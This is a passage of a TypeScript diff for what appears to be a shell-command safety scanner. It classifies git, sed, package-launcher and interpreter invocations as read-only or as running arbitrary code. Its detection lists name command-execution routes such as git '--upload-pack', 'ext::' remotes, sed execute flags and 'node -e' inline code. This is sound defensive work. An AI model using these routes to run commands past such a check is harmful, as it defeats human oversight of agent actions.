+  const git = gitSubcommand(
+    raw.map(word => optionStandIn(word, 'Cc') ?? '--\0'),
+    '.'
+  );
+  if (git === null) return null;
+  return git.unread ? 'open' : raw.length - git.rest.length - 1;
+}
+
+/** Whether the word git reads as its subcommand is one bash rewrites (`cle''an`, `c\lean`, `cl$x`), as a program word. */
+function gitSubcommandSpelled(raw: readonly string[]): boolean {
+  const at = gitSubcommandAt(raw);
+  return at === 'open' || (at !== null && SPELLED_PROGRAM.test(raw[at] as string));
+}
+
+/**
+ * Subcommand options whose value is a command line git runs, `long` (or any unique prefix) and `short`; `valued` are
+ * other letters that take the rest of their word, `exact` options a prefix would otherwise read as one of `long`.
+ */
+const GIT_COMMAND_OPTIONS: Readonly<
+  Record<string, { long: readonly string[]; short: string; valued: string; exact?: readonly string[] }>
+> = {
+  'ls-remote': { long: ['upload-pack'], short: 'u', valued: '' },
+  clone: { long: ['upload-pack'], short: 'u', valued: 'bcjo' },
+  fetch: { long: ['upload-pack'], short: '', valued: '' },
+  pull: { long: ['upload-pack'], short: '', valued: '' },
+  archive: { long: ['exec'], short: '', valued: '' },
+  push: { long: ['receive-pack', 'exec'], short: '', valued: '' },
+  grep: { long: ['open-files-in-pager'], short: 'O', valued: 'ABCefm' },
+  rebase: { long: ['exec'], short: 'x', valued: 'sX' },
+  'send-email': {
+    long: ['sendmail-cmd', 'smtp-server', 'to-cmd', 'cc-cmd', 'header-cmd'],
+    short: '',
+    valued: '',
+    exact: ['to', 'cc'],
+  },
+};
+
+/**
+ * Commands every git since 2.23 (which the app's own `git switch` needs) runs as a builtin or from its exec path, none
+ * deprecated, so no alias stands for them; any other subcommand is looked up in git's own listing (gitCommandKind).
+ */
+const GIT_OWN_COMMANDS: ReadonlySet<string> = new Set([
+  'add',
+  'am',
+  'annotate',
+  'apply',
+  'archive',
+  'bisect',
+  'blame',
+  'branch',
+  'bundle',
+  'cat-file',
+  'check-attr',
+  'check-ignore',
+  'check-ref-format',
+  'checkout',
+  'checkout-index',
+  'cherry',
+  'cherry-pick',
+  'clean',
+  'clone',
+  'commit',
+  'commit-tree',
+  'config',
+  'count-objects',
+  'credential',
+  'describe',
+  'diff',
+  'diff-files',
+  'diff-index',
+  'diff-tree',
+  'difftool',
+  'fetch',
+  'fetch-pack',
+  'filter-branch',
+  'for-each-ref',
+  'format-patch',
+  'fsck',
+  'gc',
+  'grep',
+  'hash-object',
+  'help',
+  'init',
+  'interpret-trailers',
+  'log',
+  'ls-files',
+  'ls-remote',
+  'ls-tree',
+  'merge',
+  'merge-base',
+  'merge-file',
+  'merge-tree',
+  'mergetool',
+  'mv',
+  'name-rev',
+  'notes',
+  'prune',
+  'pull',
+  'push',
+  'range-diff',
+  'read-tree',
+  'rebase',
+  'reflog',
+  'remote',
+  'repack',
+  'request-pull',
+  'rerere',
+  'reset',
+  'restore',
+  'rev-list',
+  'rev-parse',
+  'revert',
+  'rm',
+  'send-pack',
+  'shortlog',
+  'show',
+  'show-ref',
+  'stash',
+  'status',
+  'submodule',
+  'switch',
+  'symbolic-ref',
+  'tag',
+  'update-index',
+  'update-ref',
+  'var',
+  'version',
+  'worktree',
+  'write-tree',
+]);
+
+/** Config keys, or their sections, that change which alias git runs or where it reads one: see gitAliasMoved. */
+const ALIAS_LOOKUP_KEY =
+  /^(alias|include|includeif|safe)(\.|$)|^help(\.autocorrect)?$|^core\.worktree$|^extensions\.worktreeconfig$/i;
+
+/**
+ * Whether a git subcommand may write config an alias is read from: `config` changing an ALIAS_LOOKUP_KEY or a key it
+ * names by expansion, one recording a submodule or worktree, or a new repository. `rest` are its words, unquoted.
+ */
+function writesGitConfig(sub: string, rest: readonly string[]): boolean {
+  const action = rest.find(arg => !arg.startsWith('-'));
+  switch (sub) {
+    case 'config': {
+      const { operands, reads, edits, removes, adds } = gitConfigWords(rest);
+      if (reads) return false;
+      const [first = ''] = operands;
+      if (edits || first === 'edit') return true;
+      if (/^(get|list)$/.test(first)) return false;
+      const named = /^(set|unset|rename-section|remove-section)$/.test(first) ? operands.slice(1) : operands;
+      // `git config KEY` reads the key.
+      if (!(removes || adds) && named === operands && operands.length === 1) return false;
+      return named.length === 0 || named.some(word => ALIAS_LOOKUP_KEY.test(word) || /[$`]/.test(word));
+    }
+    case 'submodule':
+      // init, update and sync write only submodule.* keys.
+      return action !== undefined && !/^(status|summary|init|update|sync)$/.test(action);
+    case 'worktree':
+      return !/^(list|lock|unlock|prune|remove)$/.test(action ?? '');
+    case 'init':
+    case 'clone':
+      return true;
+    default:
+      return false;
+  }
+}
+
+/**
+ * Whether git's global options in `raw`, the shell words after `git`, may have it read an alias from other config than
+ * the scan's git: an option moving the repository, or a `-c` or `--config-env` setting an ALIAS_LOOKUP_KEY.
+ */
+function gitAliasMoved(raw: readonly string[]): boolean {
+  const at = gitSubcommandAt(raw);
+  const options = at === null || at === 'open' ? raw : raw.slice(0, at);
+  for (let index = 0; index < options.length; index++) {
+    const arg = wordValue(options[index] as string);
+    if (arg === '-C') index++;
+    else if (arg === '-c' || arg === '--config-env') {
+      const next = options[++index];
+      if (next === undefined || ALIAS_LOOKUP_KEY.test(wordValue(next).split('=')[0] as string)) {
+        return true;
+      }
+    } else if (arg.startsWith('--config-env=')) {
+      if (ALIAS_LOOKUP_KEY.test(arg.slice('--config-env='.length).split('=')[0] as string)) return true;
+    } else if (!PLAIN_GIT_OPTIONS.has(arg)) return true;
+  }
+  return false;
+}
+
+/** Subcommands that may rewrite work-tree files, where a config file the repository includes may live. */
+const GIT_TREE_WRITERS: ReadonlySet<string> = new Set([
+  'am',
+  'apply',
+  'bisect',
+  'checkout',
+  'checkout-index',
+  'cherry-pick',
+  'clean',
+  'merge',
+  'mv',
+  'pull',
+  'read-tree',
+  'rebase',
+  'reset',
+  'restore',
+  'revert',
+  'rm',
+  'sparse-checkout',
+  'stash',
+  'switch',
+]);
+
+/** Whether rsync's `args` leave out every `.git` (`--exclude .git`) and have no filter that may put one back. */
+function rsyncSkipsGit(args: readonly string[]): boolean {
+  const words = args.map(wordValue);
+  const filters = /^(--(include|filter|exclude-from|include-from|relative|files-from)([=]|$)|-[^-]*[fFR])/;
+  if (words.some(word => filters.test(word))) return false;
+  // A source naming a `.git` (even one it excludes) makes rsync create the folders leading to it.
+  const namesGit = (word: string, index: number): boolean =>
+    !word.startsWith('-') && words[index - 1] !== '--exclude' && /(^|\/)\.git(\/|$)/.test(word);
+  if (words.some(namesGit)) return false;
+  // A pattern ending in a slash (and `-C`) matches folders only, so a `.git` file still copies.
+  return words.some(
+    (word, index) =>
+      (word === '--exclude' && words[index + 1] === '.git') ||
+      (word.startsWith('--exclude=') && word.slice('--exclude='.length) === '.git')
+  );
+}
+
+/** Whether `ln` (without `-s`), `link` or `cp` (with `-l`) given `args` makes hard links. */
+function linksFiles(program: string, args: readonly string[]): boolean {
+  if (program === 'link') return true;
+  const options = args.filter(arg => arg.startsWith('-') && arg !== '-');
+  if (program === 'ln') return !options.some(arg => arg === '--symbolic' || (!arg.startsWith('--') && /s/.test(arg)));
+  return program === 'cp' && options.some(arg => arg === '--link' || (!arg.startsWith('--') && /l/.test(arg)));
+}
+
+/** The options of `truncate` and `touch` taking a value as their next word. */
+const TRUNCATE_VALUED = /^(-s|-r|--size|--reference)$/;
+const TOUCH_VALUED = /^(-r|-d|-t|--reference|--date|--time)$/;
+
+/**
+ * The operand words `program` takes away: all of rm, rmdir and unlink's, the sources of mv's. Null for another program,
+ * or one that names a `.git` or removes parent folders too.
+ */
+function removedOperands(program: string, raw: readonly string[]): string[] | null {
+  let words: string[];
+  if (/^(rm|rmdir|unlink)$/.test(program)) {
+    if (program === 'rmdir' && raw.some(word => /^(-[^-]*p|--parents)/.test(wordValue(word)))) return null;
+    const end = raw.findIndex(word => wordValue(word) === '--');
+    words = raw.filter(
+      (word, index) => (end !== -1 && index > end) || (index !== end && !wordValue(word).startsWith('-'))
+    );
+  } else if (program === 'mv') {
+    const operands = copyOperands(program, raw);
+    const target = copyTarget(program, raw)?.value ?? operands.at(-1);
+    words = operands.filter(operand => operand !== target);
+  } else {
+    return null;
+  }
+  return words.some(word => /(^|\/)\.git(\/|$)/.test(wordValue(word))) ? null : words;
+}
+
+const SHELL_STRING_NODES = new Set([
+  'program',
+  'list',
+  'pipeline',
+  'command',
+  'command_name',
+  'word',
+  'string',
+  'string_content',
+  'raw_string',
+  'number',
+  'concatenation',
+  '&&',
+  '||',
+  ';',
+  '|',
+  '"',
+  "'",
+  '\n',
+]);
+
+/**
+ * Whether `sh -c STRING`, `args` being its words after the shell, is a string of plain commands with no redirect,
+ * expansion or nesting, each only reading: the one kind of shell string whose writes the scan can list (none).
+ */
+async function readsOnlyShellString(run: string, args: readonly string[]): Promise<boolean> {
+  if (!XARGS_SHELLS.has(run) || !/^-[ex]*c$/.test(unquote(args[0] ?? ''))) return false;
+  const text = staticWord(args[1] ?? '');
+  if (text === null || text.length > 2000) return false;
+  const tree = await parseBash(text);
+  if (!tree) return false;
+  try {
+    const plain = (node: Node): boolean => {
+      if (node.hasError || !SHELL_STRING_NODES.has(node.type)) return false;
+      if (node.type === 'command') {
+        const tokens = words(node).map(unquote);
+        const program = tokens[0] ?? '';
+        if (
+          !PLAIN_PROGRAM.test(program) ||
+          isWrapper(program) ||
+          XARGS_SHELLS.has(program) ||
+          /^(git|eval|source|\.)$/.test(program) ||
+          !onlyReads(tokens)
+        ) {
+          return false;
+        }
+      }
+      return node.children.every(child => child !== null && plain(child));
+    };
+    return plain(tree.rootNode);
+  } finally {
+    tree.delete();
+  }
+}
+
+/** Options handing an interpreter (named without a version suffix) its code inline: `python3 -c`, `node -e`, `perl -pe`. */
+const INLINE_CODE_OPTIONS = new Map<string, RegExp>([
+  ['python', /^-[A-Za-z]*c/],
+  ['pypy', /^-[A-Za-z]*c/],
+  ['node', /^(-[A-Za-z]*[ep]|--eval|--print)(=|$)/],
+  ['nodejs', /^(-[A-Za-z]*[ep]|--eval|--print)(=|$)/],
+  ['bun', /^(-e|-p|--eval|--print)(=|$)/],
+  ['deno', /^eval$/],
+  ['perl', /^-[A-Za-z]*[eE]/],
+  ['ruby', /^-[A-Za-z]*e/],
+  ['php', /^-[A-Za-z]*r/],
+  ['tsx', /^(-[A-Za-z]*[ep]|--eval|--print)(=|$)/],
+  ['ts-node', /^(-[A-Za-z]*[ep]|--eval|--print)(=|$)/],
+  ['lua', /^-[A-Za-z]*e/],
+]);
+
+/** Shells, which run what their standard input holds when given no script, or `-s`. */
+const STDIN_SHELLS = new Set(['sh', 'bash', 'dash', 'zsh', 'ksh']);
+
+/** Launchers that run a tool named in their operands, by the subcommand (if any) that does. */
+const TOOL_LAUNCHERS = new Map<string, readonly string[]>([
+  ['npx', []],
+  ['bunx', []],
+  ['pnpx', []],
+  ['pnpm', ['exec', 'dlx']],
+  ['npm', ['exec', 'x']],
+  ['yarn', ['exec', 'dlx']],
+  ['bun', ['x']],
+]);
+
+/** The options a launcher with subcommands takes before its subcommand: those that take no value, and those that take one. */
+const LAUNCHER_OPTIONS = new Map<string, { flags: ReadonlySet<string>; valued: ReadonlySet<string> }>([
+  [
+    'pnpm',
+    {
+      flags: new Set(
+        '-w --workspace-root -r --recursive -s --silent --stream --no-color --color --parallel --ignore-workspace --offline --prefer-offline --if-present --sort --no-sort --aggregate-output --fail-if-no-match --report-summary --use-stderr'.split(
+          ' '
+        )
+      ),
+      valued: new Set(
+        '-C --dir -F --filter --filter-prod --workspace-concurrency --workspace-packages --reporter --loglevel --test-pattern --changed-files-ignore-pattern --store-dir --virtual-store-dir --modules-dir --lockfile-dir --network-concurrency'.split(
+          ' '
+        )
+      ),
+    },
+  ],
+  [
+    'npm',
+    {
+      flags: new Set(
+        '--workspaces --ws --include-workspace-root -g --global -y --yes --ignore-scripts --no-audit --no-fund --legacy-peer-deps -f --force'.split(
+          ' '
+        )
+      ),
+      valued: new Set('-w --workspace'.split(' ')),
+    },
+  ],
+  // Options the installed help does not confirm are left out, so one before the subcommand reads as unknown.
+  ['yarn', { flags: new Set(), valued: new Set() }],
+  ['bun', { flags: new Set(), valued: new Set() }],
+]);
+
+/**
+ * Where `name`'s own subcommand sits in `args`, past the options it takes before one (pnpm's `recursive` too);
+ * `unread` when an option there is not one the scan knows, so the subcommand cannot be told.
+ */
+function launcherOperand(name: string, args: readonly string[]): { at: number; unread: boolean } {
+  const options = LAUNCHER_OPTIONS.get(name);
+  let at = 0;
+  while (options !== undefined && at < args.length) {
+    const word = unquote(args[at] as string);
+    if (word === '--') return { at, unread: true };
+    if (!word.startsWith('-') || word === '-') {
+      if (name !== 'pnpm' || !['recursive', 'multi', 'm'].includes(word)) break;
+      at++;
+    } else if (word.startsWith('--') && word.includes('=')) at++;
+    else if (options.valued.has(word)) at += 2;
+    else if (options.flags.has(word)) at++;
+    else if (/^-[A-Za-z]{2,}$/.test(word) && [...word.slice(1)].every(letter => options.flags.has(`-${letter}`))) at++;
+    else return { at, unread: true };
+  }
+  return { at, unread: false };
+}
+
+/** The executable a package launcher names; unknown options never become an arbitrary later operand. */
+export function packageCommand(tokens: readonly string[]): { at: number; unread: boolean } | null {
+  const name = programName(unquote(tokens[0] ?? '')).replace(/[\d.]+$/, '');
+  const launcher = TOOL_LAUNCHERS.get(name);
+  if (launcher === undefined) return null;
+  const args = tokens.slice(1);
+  const leading = launcherOperand(name, args);
+  if (leading.unread) return { at: leading.at + 1, unread: true };
+  let at = leading.at;
+  if (launcher.length > 0) {
+    const first = unquote(args[at] ?? '');
+    if (launcher.includes(first)) at++;
+    else if (!(BUILTIN_COMMANDS.get(name)?.has(first) === false && first !== '' && !first.startsWith('-'))) return null;
+  }
+  const valued = new Set([...PACKAGE_VALUE_OPTIONS, '--package', '-p', '--workspace', '--cwd', '--reporter']);
+  const flags = new Set([
+    '-w',
+    '-r',
+    '-g',
+    '-y',
+    '-q',
+    '--yes',
+    '--no',
+    '--quiet',
+    '--silent',
+    '--offline',
+    '--prefer-offline',
+    '--prefer-online',
+    '--no-install',
+    '--ignore-existing',
+    '--ignore-scripts',
+  ]);
+  while (at < args.length) {
+    const word = unquote(args[at] as string);
+    if (word === '--') {
+      at++;
+      break;
+    }
+    if (!word.startsWith('-') || word === '-') break;
+    const [option = ''] = word.split('=');
+    if (valued.has(option)) at += word.includes('=') ? 1 : 2;
+    else if (flags.has(option)) at++;
+    else if (/^-[pFC].+/.test(word)) at++;
+    else return { at: at + 1, unread: true };
+  }
+  return { at: at + 1, unread: at >= args.length || isDynamic(args[at] ?? '') };
+}
+
+/** `git clone`, `init` and `worktree add` options that take no value, and those that take one (as the next word or after `=`). */
+const FRESH_FLAGS = new Map<string, { flags: ReadonlySet<string>; valued: ReadonlySet<string> }>([
+  [
+    'clone',
+    {
+      flags: new Set(
+        '-q --quiet -v --verbose --progress -n --no-checkout --bare --mirror -l --local --no-local --no-hardlinks -s --shared --dissociate --single-branch --no-single-branch --no-tags --sparse --shallow-submodules --no-remote-submodules --remote-submodules -4 -6 --reject-shallow'.split(
+          ' '
+        )
+      ),
+      valued: new Set(
+        '-b --branch -o --origin --depth -j --jobs --filter --shallow-since --shallow-exclude'.split(' ')
+      ),
+    },
+  ],
+  [
+    'init',
+    {
+      flags: new Set(['-q', '--quiet', '--bare']),
+      valued: new Set(['-b', '--initial-branch', '--object-format']),
+    },
+  ],
+  [
+    'worktree',
+    {
+      flags: new Set(
+        '-f --force -d --detach --no-checkout --checkout --lock -q --quiet --track --no-track --guess-remote --no-guess-remote --orphan'.split(
+          ' '
+        )
+      ),
+      valued: new Set(['-b', '-B', '--reason']),
+    },
+  ],
+]);
+
+/**
+ * The folder, as written, that `git clone`, `init` or `worktree add` makes (`.` for an init naming none), when its
+ * options leave the config to the user's (and, for a work tree, the repository's); `user` is true for the former.
+ */
+function freshFolder(sub: string, rest: readonly string[]): { folder: string; user: boolean } | null {
+  const grammar = FRESH_FLAGS.get(sub);
+  if (grammar === undefined) return null;
+  const words = sub === 'worktree' ? rest.slice(1) : rest;
+  if (sub === 'worktree' && rest[0] !== 'add') return null;
+  const positionals: string[] = [];
+  for (let index = 0; index < words.length; index++) {
+    const word = unquote(words[index] as string);
+    if (word === '--') {
+      positionals.push(...words.slice(index + 1).map(unquote));
+      break;
+    }
+    if (!word.startsWith('-') || word === '-') {
+      positionals.push(word);
+      continue;
+    }
+    const [name = ''] = word.split('=');
+    if (grammar.flags.has(word)) continue;
+    if (grammar.valued.has(name)) {
+      if (!word.includes('=')) index++;
+      continue;
+    }
+    // Glued short values (`-bmain`) and anything else are options the scan does not read.
+    return null;
+  }
+  let folder: string | undefined;
+  if (sub === 'clone') {
+    const [source, named] = positionals;
+    if (source === undefined || positionals.length > 2) return null;
+    folder = named ?? posix.basename(source.replace(/[\\/]+$/, '')).replace(/\.git$/, '');
+  } else {
+    folder = positionals[0] ?? (sub === 'init' ? '.' : undefined);
+    if (sub === 'init' && positionals.length > 1) return null;
+  }
+  return folder === undefined || folder === '' ? null : { folder, user: sub !== 'worktree' };
+}
+
+/** Subcommands taking `--strategy NAME`. */
+const STRATEGY_COMMANDS: ReadonlySet<string> = new Set(['merge', 'pull', 'rebase', 'cherry-pick', 'revert']);
+
+/** Short flags that may precede `-s` in one cluster (a superset), for the subcommands where `-s` is the strategy. */
+const MERGE_NO_VALUE_FLAGS: ReadonlyMap<string, string> = new Map([
+  ['merge', 'nqvef'],
+  ['pull', 'nqvefakptu46'],
+  ['rebase', 'nqvefikmp'],
+]);
+
+/** Subcommands whose operands may name a remote by `<name>::<address>`. */
+const REMOTE_HELPER_COMMANDS: ReadonlySet<string> = new Set(['fetch', 'pull', 'push', 'clone', 'ls-remote']);
+
+/** Remote helpers git runs from its own exec path before PATH; names are matched as written. */
+const BUILT_IN_REMOTE_HELPERS: ReadonlySet<string> = new Set(['http', 'https', 'ftp', 'ftps', 'ext']);
+
+/** Merge strategies git builds in; any other name runs a git-merge-<name> program from PATH. */
+const MERGE_STRATEGIES: ReadonlySet<string> = new Set(['ort', 'recursive', 'resolve', 'octopus', 'ours', 'subtree']);
+
+/** The commands pnpm and yarn run themselves; any other first word is a tool they launch. */
+const BUILTIN_COMMANDS = new Map<string, ReadonlySet<string>>([
+  [
+    'pnpm',
+    new Set(
+      'add approve-builds audit bin cache completion config create dedupe deploy dlx doctor env exec fetch i import init install install-test it link list ln ls outdated pack patch patch-commit patch-remove prune publish rebuild recursive remove restart rm root run self-update server setup start stop store t test uninstall unlink up update upgrade view why'.split(
+        ' '
+      )
+    ),
+  ],
+  [
+    'yarn',
+    new Set(
+      'add audit autoclean bin cache check config constraints create dedupe dlx exec explain generate-lock-entry global help import info init install licenses link list login logout npm outdated owner pack patch plugin policies prune publish rebuild remove run search set stage start tag team test unlink unplug up upgrade upgrade-interactive version versions view why workspace workspaces'.split(
+        ' '
+      )
+    ),
+  ],
+]);
+
+/**
+ * Whether `args`, unquoted, hand `program` code to run inline rather than a script file: an option giving it, or no
+ * script operand (or `-`) while `node`'s standard input is fed (a here-string, here-doc or pipe).
+ */
+function runsInlineCode(program: string, args: readonly string[], node: Node): boolean {
+  const name = program.replace(/[\d.]+$/, '');
+  const first = args[0] ?? '';
+  const launch = packageCommand([program, ...args]);
+  if (launch?.unread) return true;
+  if (launch !== null) {
+    const tokens = [program, ...args];
+    return runsInlineCode(programName(tokens[launch.at] ?? ''), tokens.slice(launch.at + 1), node);
+  }
+  if (name === 'deno' && first === 'run') {
+    const operand = args.slice(1).find(arg => arg === '-' || !arg.startsWith('-'));
+    return operand === '-';
+  }
+  if (STDIN_SHELLS.has(name)) {
+    const { operands } = interpreterOptions(name, args);
+    const options = args.slice(0, args.length - operands.length);
+    if (options.some(arg => /^-[A-Za-z]*s/.test(arg) && !arg.startsWith('--'))) return true;
+    return (operands.length === 0 || operands[0] === '-') && readsStdin(node);
+  }
+  const option = INLINE_CODE_OPTIONS.get(name);
+  if (option === undefined) return false;
+  if (args.some(arg => option.test(arg))) return true;
+  const { operands } = interpreterOptions(name, args);
+  return (operands.length === 0 || operands[0] === '-') && readsStdin(node);
+}
+
+/** How many aliases in a row the scan follows; git stops at a loop. */
+const GIT_ALIAS_DEPTH = 8;
+
+/** A word of an alias's expansion as a shell word that passes it unchanged; null for one holding a single quote. */
+function aliasWord(word: string): string | null {
+  if (/^[\w@%+=:,./-]+$/.test(word)) return word;
+  return word.includes("'") ? null : `'${word}'`;
+}
+
+/**
+ * Whether a git call runs a command line its words give with no file to check: a subcommand option such as
+ * `--upload-pack`, or an `ext::` remote. `raw` are the shell words after `git`.
+ */
+function gitRunsGivenCommand(raw: readonly string[]): boolean {
+  if (raw.some(word => /(^|=)ext::/i.test(wordValue(word)))) return true;
+  const at = gitSubcommandAt(raw);
+  if (at === null) return false;
+  if (at === 'open') return true;
+  const sub = wordValue(raw[at] ?? '');
+  const options = own(GIT_COMMAND_OPTIONS, sub);
+  if (options === undefined) return false;
+  const { long, short, valued, exact = [] } = options;
+  const runs = (option: string): boolean => {
+    const name = /^--?([^-=][^=]*)/.exec(option)?.[1];
+    if (name === undefined) return false;
+    // send-email reads long options after one dash as well; git's own parser reads `-x` as short letters.
+    if (option.startsWith('--') || sub === 'send-email') {
+      if (long.some(full => full.startsWith(name)) && !exact.includes(name)) return true;
+      if (option.startsWith('--')) return false;
+    }
+    for (const letter of name) {
+      if (letter === short) return true;
+      if (valued.includes(letter) || !/[A-Za-z0-9]/.test(letter)) return false;
+    }
+    return false;
+  };
+  const names = long.map(full => `--${full}`);
+  return raw.slice(at + 1).some(word => mayPassOption(word, valued + short, runs, names, short !== ''));
+}
+
+/**
+ * The command `timeout [options] DURATION command...` runs, or null when it cannot be read off
+ * the text. The duration and option values are inert; only the wrapped command matters.
+ */
+function timeoutCommand(raw: readonly string[]): string[] | null {
+  const at = wrapperWords('timeout', raw, 0).end;
+  const duration = raw[at];
+  if (duration === undefined || !/^\d+(\.\d+)?[smhd]?$/.test(unquote(duration))) return null;
+  const command = raw.slice(at + 1);
+  return command.length > 0 ? [...command] : null;
+}
+
+/**
+ * Whether `set` only flips shell options (`set -e`, `set -euo pipefail`, `set +x`). Positional
+ * arguments (`set -- a b`) are refused: later commands could read them back as `$1`.
+ */
+function setOnlyChangesOptions(args: readonly string[]): boolean {
+  if (args.length === 0) return false;
+  for (let at = 0; at < args.length; at++) {
+    const arg = args[at];
+    if (!/^[-+][A-Za-z]+$/.test(arg)) return false;
+    if (arg.endsWith('o')) {
+      at++;
+      if (!/^[a-z]+$/.test(args[at] ?? '')) return false;
+    }
+  }
+  return true;
+}
+
+/**
+ * One sed script that only prints, deletes or quits over a line range: `1,45p`, `$d`, `10q`.
+ * Anything else is refused, because sed's `e` command and `s///e` flag run a program and `w`
+ * writes a file, and telling those apart from a substitution needs a full sed parser.
+ */
+const READ_ONLY_SED_SCRIPT = /^(?:(?:\d+|\$)(?:,(?:\d+|\$))?)?[pdq]$/;
+
+/**
+ * Whether a sed call only reads: `-n` and `-E`/`-r` flags, at most one inline script (bare or
+ * after `-e`) of the `READ_ONLY_SED_SCRIPT` shape, then input files. No `-i`, no `-f` script file,
+ * and no script the shell would expand first.
+ */
+function readOnlySed(raw: readonly string[]): boolean {
+  let script: string | null = null;
+  let at = 0;
+  for (; at < raw.length; at++) {
+    const arg = bashOption(raw[at]);
+    if (arg === null) return false;
+    if (arg === '-e' || arg === '--expression') {
+      if (script !== null) return false;
+      script = raw[++at] ?? null;
+      if (script === null) return false;
+      continue;
+    }
+    if (/^-[nEr]+$/.test(arg) || arg === '--quiet' || arg === '--silent' || arg === '--regexp-extended') continue;
+    if (arg.startsWith('-')) return false;
+    break;
+  }
+  if (script === null) script = raw[at++] ?? null;
+  if (script === null) return false;
+  // `"1,$p"` is expanded by the shell before sed sees it; only a single-quoted or plain script is literal.
+  if (isDynamic(script) && !script.startsWith("'")) return false;
+  if (!READ_ONLY_SED_SCRIPT.test(unquote(script))) return false;
+  return raw.slice(at).every(arg => !isDynamic(arg) && !(bashOption(arg) ?? '-').startsWith('-'));
+}
+
+/** Contained programs that still create or write files on their own. */
+const WRITES_LOCALLY = new Set(['mkdir', 'tee']);
+
+/** git subcommands that only report on the repository. `branch` and the rest are judged in `readOnlyGit`. */
+const GIT_REPORTS = new Set([
+  'blame',
+  'cat-file',
+  'describe',
+  'diff',
+  'log',
+  'ls-files',
+  'merge-base',
+  'rev-list',
+  'rev-parse',
+  'shortlog',
+  'show',
+  'status',
+]);
+
+/**
+ * Whether a git call only reports, optionally run elsewhere with `-C DIR` or `--no-pager`. Any
+ * other global option (`-c`, `--git-dir`, `--exec-path`) is refused, as are `--output` and
+ * `--ext-diff`. Repository config can still name a program, which is why this decides only
+ * whether a worktree may read its own main checkout, which shares that config, never containment.
+ */
+export function readOnlyGit(raw: readonly string[]): boolean {
+  if (raw.length === 0 || raw.some(isDynamic)) return false;
+  const tokens = bashOptions(raw);
+  if (tokens === null || tokens[0] !== 'git') return false;
+  let at = 1;
+  while (at < tokens.length && tokens[at].startsWith('-')) {
+    if (tokens[at] === '-C') at += 2;
+    else if (tokens[at] === '--no-pager') at++;
+    else return false;
+  }
+  const [subcommand, ...args] = tokens.slice(at);
+  if (subcommand === undefined) return false;
+  if (args.some(arg => /^--(output|ext-diff|open-files-in-pager)(=|$)/.test(arg) || /^-O/.test(arg))) return false;
+  if (GIT_REPORTS.has(subcommand)) return true;
+  if (subcommand === 'branch') {
+    return args.every(arg => /^(--show-current|--list|-[alrv]+|--all|--remotes|--verbose|--no-color)$/.test(arg));
+  }
+  if (subcommand === 'remote') return args.every(arg => arg === '-v' || arg === '--verbose');
+  if (subcommand === 'worktree' || subcommand === 'stash') return args[0] === 'list';
+  return false;
+}
+
+/** `git` is false to leave the git reports out: git may run a program the repository names, so its folder is not only read. */
+function onlyReads(raw: readonly string[], git = true): boolean {
+  const command = unquote(raw[0] ?? '') === 'timeout' ? timeoutCommand(raw.slice(1)) : raw;
+  if (!command || command.length === 0) return false;
+  return (containedCommand(command) && !WRITES_LOCALLY.has(unquote(command[0]))) || (git && readOnlyGit(command));
+}
+
 /** gh subcommands that only read from GitHub. `api` is judged on its own in `readOnlyGh`. */
 const GH_READS: Readonly<Record<string, ReadonlySet<string>>> = {
   pr: new Set(['checks', 'diff', 'list', 'status', 'view']),
@@ -655,7 +6433,152 @@ function readOnlyGh(args: readonly string[]): boolean {
   if (sub === 'api') {
     return outboundReason(['gh', ...args]) === null && !args.some(arg => /^--input(=|$)/.test(arg));
   }
-  return GH_READS[sub]?.has(action) === true;
+  return own(GH_READS, sub)?.has(action) === true;
+}
+
+/** Environment variables that only tune a run's output or parallelism. Any other name in front of a command makes it uncoverable. */
+const TUNING_VARIABLE = /^(CI|NODE_ENV|FORCE_COLOR|NO_COLOR|TZ|DEBUG|LANG|LC_[A-Z]+|VITEST_MAX_WORKERS)$/;
+
+/**
+ * Whether a `NAME=value` in front of a command only tunes it (`CI=1`, `VITEST_MAX_WORKERS=25%`):
+ * the name is in TUNING_VARIABLE and the value is literal, so it neither runs a
+ * command substitution nor carries what one read.
+ */
+function harmlessAssignment(name: string, value: string): boolean {
+  return TUNING_VARIABLE.test(name) && !isDynamic(value);
+}
+
+/** Task names a package script or turbo pipeline runs under for testing, checking or building. */
+const DEV_TASK_WORDS = new Set([
+  'test',
+  'tests',
+  'spec',
+  'unit',
+  'e2e',
+  'integration',
+  'typecheck',
+  'types',
+  'tsc',
+  'lint',
+  'eslint',
+  'stylelint',
+  'format',
+  'fmt',
+  'prettier',
+  'build',
+  'compile',
+  'check',
+  'verify',
+  'validate',
+  'coverage',
+  'vitest',
+  'jest',
+]);
+
+/** A task named for any of these reaches past this computer, whatever else its name says. */
+const OUTBOUND_TASK_WORDS = new Set(['deploy', 'release', 'publish', 'push', 'upload', 'sync', 'ship']);
+
+/** `test`, `turbo:typecheck`, `lint:check` - but not `deploy:build`. */
+function devTask(name: string): boolean {
+  const parts = name.toLowerCase().split(/[:._/-]+/);
+  return parts.some(part => DEV_TASK_WORDS.has(part)) && !parts.some(part => OUTBOUND_TASK_WORDS.has(part));
+}
+
+/** Package-manager options that only pick which packages a task runs in, or how it prints. */
+const PACKAGE_FLAGS = new Set([
+  '-r',
+  '--recursive',
+  '--parallel',
+  '--stream',
+  '-w',
+  '--workspace-root',
+  '-s',
+  '--silent',
+  '--if-present',
+]);
+
+/** Options that open a server or debugger port a page could then talk to. */
+const VITEST_SERVES = /^--(browser([.=]|$)|(browser\.)?(api|ui|open|inspect|inspect-brk|host)([.=]|$))/;
+
+/** Turbo options that read from or write to a remote cache. */
+const TURBO_REMOTE = /^--(api|token|team|login|cache|remote-only|remote-cache-read-only|preflight)(=|$)/;
+
+/** Node options that change nothing about what it loads; `--require`, `--import` and `-e` are not here. */
+const NODE_FLAGS =
+  /^--(test|test-only|test-(name-pattern|skip-pattern|concurrency|timeout|shard)=.+|enable-source-maps|no-warnings|trace-warnings|trace-uncaught|experimental-(strip-types|transform-types|vm-modules)|max-old-space-size=\d+|stack-size=\d+)$/;
+
+/** A relative path that does not climb out of the folder it is resolved against. */
+function staysInFolder(path: string): boolean {
+  return !isAbsolute(path) && !path.startsWith('~') && !STDIN_SCRIPT_ARG.test(path) && !path.split('/').includes('..');
+}
+
+function devTool(tokens: readonly string[]): boolean {
+  const [program, ...args] = tokens;
+  switch (program) {
+    case 'tsc':
+    case 'jest':
+    case 'prettier':
+      return true;
+    case 'eslint':
+      return !args.includes('--init');
+    case 'vitest':
+      return args[0] !== 'init' && !args.some(arg => VITEST_SERVES.test(arg));
+    case 'turbo': {
+      const rest = args[0] === 'run' ? args.slice(1) : args;
+      const firstOption = rest.findIndex(arg => arg.startsWith('-'));
